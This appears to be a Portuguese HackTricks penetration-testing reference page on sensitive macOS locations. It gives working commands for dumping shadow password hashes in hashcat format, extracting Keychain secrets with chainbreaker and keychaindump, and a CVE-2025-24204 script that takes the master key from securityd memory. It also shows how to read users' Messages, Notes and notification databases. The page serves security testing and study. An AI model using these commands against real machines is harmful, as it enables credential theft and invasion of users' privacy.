# Locais sensíveis e daemons interessantes do macOS

{{#include ../../../banners/hacktricks-training.md}}


## Senhas

### Senhas shadow

A senha shadow é armazenada com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
O one-liner a seguir pode ser usado para despejar **todas as informações sobre os usuários** (incluindo informações de hash):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**este**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para o **formato** **hashcat**.

Uma alternativa de comando de uma linha que despeja as credenciais de todas as contas que não são de serviço no formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Outra forma de obter o `ShadowHashData` de um usuário é usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Converter ShadowHashData copiado no Linux

Se o atributo foi copiado para um host Linux de cracking, salve **somente seus bytes hexadecimais** (não o rótulo `ShadowHashData:`) em `shadowhash.hex`. No Ubuntu, `libplist-utils` converte o plist binário decodificado em XML legível sem o `plutil` do macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

No XML, use `iterations` e os valores `salt` e `entropy` em base64 de **`SALTED-SHA512-PBKDF2`**, não o verificador SRP separado. Defina `salt_b64` e `entropy_b64` com o conteúdo dos respectivos elementos `<data>` do XML. Decodifique-os para hexadecimal e forme uma linha no formato `$ml$<iterations>$<salt_hex>$<entropy_hex>` para o modo `7100` do Hashcat. Isso é tentativa offline após a obtenção privilegiada do hash, não um método de acesso inicial nem de escalonamento de privilégios.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Este arquivo é **usado apenas** quando o sistema está em execução no **modo de usuário único** (portanto, não com muita frequência).

### Dump do Keychain

Observe que, ao usar o binário `security` para **despejar as senhas descriptografadas**, vários prompts pedirão que o usuário permita essa operação.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

No macOS moderno, os stores subjacentes mais interessantes geralmente são **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Eles são arquivos baseados em SQLite, mas o acesso em texto simples ainda é mediado pelo **`securityd`**: roubar o DB bruto fornece principalmente metadados e blobs criptografados, a menos que você também recupere a senha do usuário, a `SystemKey` ou uma master key que esteja na memória.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Com base neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que essas ferramentas não funcionam mais no Big Sur.

### Visão geral do Keychaindump

Uma ferramenta chamada **keychaindump** foi desenvolvida para extrair senhas dos keychains do macOS, mas enfrenta limitações em versões mais recentes do macOS, como o Big Sur, conforme indicado nesta [discussão](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). O uso do **keychaindump** exige que o atacante obtenha acesso e eleve os privilégios a **root**. A ferramenta explora o fato de que, por conveniência, o keychain é desbloqueado por padrão quando o usuário faz login, permitindo que os aplicativos o acessem sem solicitar repetidamente a senha do usuário. No entanto, se o usuário optar por bloquear o keychain após cada uso, o **keychaindump** se torna ineficaz.

O **Keychaindump** atua contra um processo específico chamado **securityd**, descrito pela Apple como um daemon para operações de autorização e criptografia, essencial para acessar o keychain. O processo de extração envolve identificar uma **Master Key** derivada da senha de login do usuário. Essa chave é essencial para ler o arquivo do keychain. Para localizar a **Master Key**, o **keychaindump** verifica o heap de memória do **securityd** usando o comando `vmmap`, procurando possíveis chaves em áreas marcadas como `MALLOC_TINY`. O comando a seguir é usado para inspecionar essas localizações de memória:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Após identificar possíveis master keys, **keychaindump** pesquisa nos heaps um padrão específico (`0x0000000000000018`) que indica uma possível master key. São necessárias outras etapas, incluindo a desofuscação, para utilizar essa chave, conforme descrito no código-fonte do **keychaindump**. Analistas que se concentram nessa área devem observar que os dados essenciais para descriptografar o keychain estão armazenados na memória do processo **securityd**. Um exemplo de comando para executar **keychaindump** é:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode extrair os seguintes tipos de informação de um keychain do macOS de maneira forensicamente confiável:

- Senha do Keychain em hash, adequada para quebra com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Senhas da Internet
- Senhas genéricas
- Chaves privadas
- Chaves públicas
- Certificados X509
- Notas seguras
- Senhas do Appleshare

Com a senha de desbloqueio do keychain, uma chave mestra obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá senhas em texto simples.

Sem um desses métodos para desbloquear o Keychain, o Chainbreaker exibirá todas as outras informações disponíveis.

#### **Dump de chaves do keychain**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump de chaves do keychain (com senhas) com SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump de chaves do keychain (com senhas) e cracking do hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump de chaves do keychain (com senhas) com memory dump**

[ siga estas etapas](../index.html#dumping-memory-with-osxpmem) para realizar um **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump de chaves do keychain (com senhas) usando a senha do usuário**

Se você souber a senha do usuário, poderá usá-la para fazer dump e descriptografar os keychains que pertencem ao usuário.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Chave mestra do Keychain via entitlement `gcore` (CVE-2025-24204)

O macOS 15.0 (Sequoia) veio com `/usr/bin/gcore` e o entitlement **`com.apple.system-task-ports.read`**, permitindo que qualquer administrador local (ou aplicativo malicioso assinado) fizesse dump da memória de **qualquer processo, mesmo com SIP/TCC aplicados**. Fazer dump de `securityd` causa leak da **chave mestra do Keychain** em texto claro e permite descriptografar `login.keychain-db` sem a senha do usuário.<sup>[[1]](#references)</sup>

**Reprodução rápida em versões vulneráveis (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Passe a chave hexadecimal extraída para o Chainbreaker (`--key <hex>`) para descriptografar o chaveiro de login. A Apple removeu o entitlement no **macOS 15.3+**, então isso só funciona em versões do Sequoia sem patches ou em sistemas que mantiveram o binário vulnerável.

### kcpassword

O arquivo **kcpassword** armazena a **senha de login do usuário**, mas somente se o proprietário do sistema tiver **ativado o login automático**. Assim, o usuário será conectado automaticamente, sem que seja solicitada uma senha (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`**, submetida a XOR com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa que a chave, a chave será reutilizada.\
Isso torna a senha bem fácil de recuperar, por exemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações interessantes em bancos de dados

### Mensagens

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notificações

Antes do **Sequoia**, geralmente é possível encontrar o banco de dados da Central de Notificações em **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. No **Sequoia+**, a Apple o moveu para o contêiner de grupo protegido pelo TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

A maioria das informações interessantes fica armazenada em colunas **blob**, então será necessário extrair esse conteúdo e convertê-lo em algo legível (`plutil -p -`, `strings` ou um pequeno parser). Exemplos de triagem rápida:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Problemas recentes de privacidade (DB do NotificationCenter)

- No macOS **14.7–15.1**, a Apple armazenava o conteúdo dos banners no SQLite `db2/db` sem redação adequada. Os CVEs **CVE-2024-44292/44293/40838/54504** permitiam que qualquer usuário local lesse o texto das notificações de outros usuários apenas abrindo o DB (sem solicitação do TCC).<sup>[[3]](#references)</sup>
- A Apple mitigou isso movendo o DB para `group.com.apple.usernoted` e protegendo-o com o TCC nas versões mais recentes do Sequoia. Portanto, nos sistemas atuais, normalmente é necessário o contexto do usuário correto ou um TCC bypass para lê-lo.<sup>[[4]](#references)</sup>
- Em endpoints legados, copie os arquivos `db`, `db-wal` e `db-shm` juntos antes de atualizar ou reiniciar se quiser preservar os artefatos.

### Observações

As **notas** dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Se o one-liner acima gerar muito ruído, exporte `ZICNOTEDATA.ZDATA`, descompacte com gunzip e analise o protobuf: isso costuma ser mais confiável do que executar `strings` diretamente no SQLite.

### Tarefas em segundo plano / Itens de início de sessão

Desde o **Ventura**, os itens de início de sessão aprovados pelo usuário e várias tarefas em segundo plano são rastreados em armazenamentos **BTM**, como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e o cache de sistema versionado **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Esses arquivos são úteis para identificar rapidamente mecanismos de persistência, ferramentas auxiliares e alguns itens em segundo plano gerenciados por MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Para a perspectiva de persistência e os detalhes internos do BTM, consulte [a página de locais de inicialização automática](../../macos-auto-start-locations.md#login-items) e [as notas sobre o Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferências

No macOS, as preferências dos apps ficam em **`$HOME/Library/Preferences`**; no iOS, ficam em `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

No macOS, a ferramenta CLI **`defaults`** pode ser usada para **modificar o arquivo de preferências**.

**`/usr/sbin/cfprefsd`** reivindica os serviços XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e pode ser chamado para realizar ações como modificar preferências.

## OpenDirectory permissions.plist

O arquivo `/System/Library/OpenDirectory/permissions.plist` contém permissões aplicadas a atributos de nós e é protegido pelo SIP.\
Esse arquivo concede permissões a usuários específicos por UUID (e não por UID), permitindo que eles acessem informações confidenciais específicas, como `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, entre outras:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Notificações do Sistema

### Notificações do Darwin

O daemon principal para notificações é **`/usr/sbin/notifyd`**. Para receber notificações, os clientes precisam se registrar por meio da porta Mach `com.apple.system.notification_center` (verifique-os com `sudo lsmp -p <pid notifyd>`). O daemon pode ser configurado com o arquivo `/etc/notify.conf`.

Os nomes usados para notificações são notações DNS reversas exclusivas e, quando uma notificação é enviada para um deles, os clientes que indicaram que podem tratá-la a receberão.

É possível despejar o status atual (e ver todos os nomes) enviando o sinal SIGUSR2 ao processo notifyd e lendo o arquivo gerado: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

O **Distributed Notification Center**, cujo binário principal é **`/usr/sbin/distnoted`**, é outra forma de enviar notificações. Ele expõe alguns serviços XPC e realiza algumas verificações para tentar validar os clientes.

### Apple Push Notifications (APN)

Nesse caso, os aplicativos podem se registrar em **tópicos**. O cliente gera um token ao se conectar aos servidores da Apple por meio do **`apsd`**.\
Em seguida, os provedores também terão gerado um token e poderão se conectar aos servidores da Apple para enviar mensagens aos clientes. Essas mensagens serão recebidas localmente pelo **`apsd`**, que retransmitirá a notificação ao aplicativo que estiver aguardando por ela.

As preferências estão em `/Library/Preferences/com.apple.apsd.plist`.

Há um banco de dados local de mensagens no macOS, em `/Library/Application\ Support/ApplePushService/aps.db`, e no iOS, em `/var/mobile/Library/ApplePushService`. Ele tem 3 tabelas: `incoming_messages`, `outgoing_messages` e `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Também é possível obter informações sobre o daemon e as conexões usando:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Notificações do usuário

Estas são notificações que o usuário deve ver na tela:

- **`CFUserNotification`**: Esta API permite exibir uma janela pop-up com uma mensagem na tela.
- **The Bulletin Board**: Exibe no iOS um banner que desaparece e é armazenado na Central de Notificações.
- **`NSUserNotificationCenter`**: O serviço legado da Central de Notificações no macOS. Em versões mais antigas, o banco de dados geralmente fica em `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; no Sequoia e versões posteriores, foi movido para `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – entitlement gcore do macOS permitiu a extração da chave mestra do Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Proteção de dados do Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Divulgação de SQLite da Central de Notificações (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple aborda preocupações de privacidade em torno do banco de dados da Central de Notificações no macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Quebra de senhas do macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat example hashes – exemplos de hashes do macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
